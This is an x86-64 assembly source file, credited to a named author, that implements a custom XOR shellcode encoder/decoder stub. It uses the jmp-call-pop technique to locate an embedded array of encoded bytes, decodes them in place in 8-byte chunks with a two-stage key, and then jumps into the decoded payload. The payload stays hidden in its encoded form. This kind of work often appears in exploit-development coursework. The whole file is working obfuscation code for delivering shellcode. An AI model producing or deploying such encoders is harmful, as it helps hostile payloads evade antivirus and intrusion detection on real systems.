; Author: Robert C. Raducioiu

global _start

section .text

_start:

    ; clear RBX
    xor ecx, ecx

    ; clear RDX and RAX registers
    mul rcx

    ; clear RCX
    push rax
    pop rcx

    jmp CallGetShellcodeLength

GetShellcodeLength:

    pop r10
    jmp short CallShellcode

Shellcode:

    ; get the address of the encoded shellcode
    pop rsi
    sub r10, rsi
    sub r10, 5

    ; clear RDI
    push rax
    pop rdi

    mov r9, rsi

    ; base address of the decoded shellcode
    push r9

    mov al, [rsi]
    mov dl, [rsi + 1]

    ; second stage xor key
    xor dl, al

    sub r9, 7
    sub rsi, 8

LoopDecode:

    ; increase RSI to skip the XOR byte of the 8-bytes chunk
    add rsi, 8
    add r9, 7

    xor eax, eax

    mov bl, BYTE [rsi + rax]
    xor bl, dl

    inc rdi
    inc rax

CopyDecodedByte:

    mov cl, BYTE [rsi + rax]
    xor cl, bl

    ; replace the encoded byte with the decoded one
    mov BYTE [r9 + rax], cl

    inc rdi
    cmp rdi, r10
    jz RunShellcode

    add al, 1
    cmp al, 8
    jz LoopDecode

    jmp short CopyDecodedByte

RunShellcode:

    pop rax
    add al, 2
    call rax
    
CallShellcode:

    call Shellcode
    encoded: db 0x92,0x2f,0x1e,0xe6,0x67,0xd8,0xce,0x67,0xfe,0xca,0x17,0x67,0xbb,0xb,0xc0,0xaf,0x60,0xd5,0x89,0x87,0x95,0x63,0x86,0xdc,0xf3,0x45,0x52,0x15,0x2,0x5f,0x54,0x6,0xa4,0xa2,0x6d,0x7a,0x7b,0x6b,0x6d,0x7a,0xdb,0x4,0x14,0x2e,0x57,0xb8,0x30,0x32,0x56,0xb4,0xba,0xa3,0x62,0x97,0xcf,0x13,0x1b,0xee,0x25,0x4a,0xae,0xee,0x2b,0x92,0x3f,0xa6,0x1,0x42,0xbe,0xca,0x7d,0x4a,0xa0,0x12,0x18,0xa0,0xa0,0xa0,0xa0,0xa0
    
CallGetShellcodeLength:

    call GetShellcodeLength
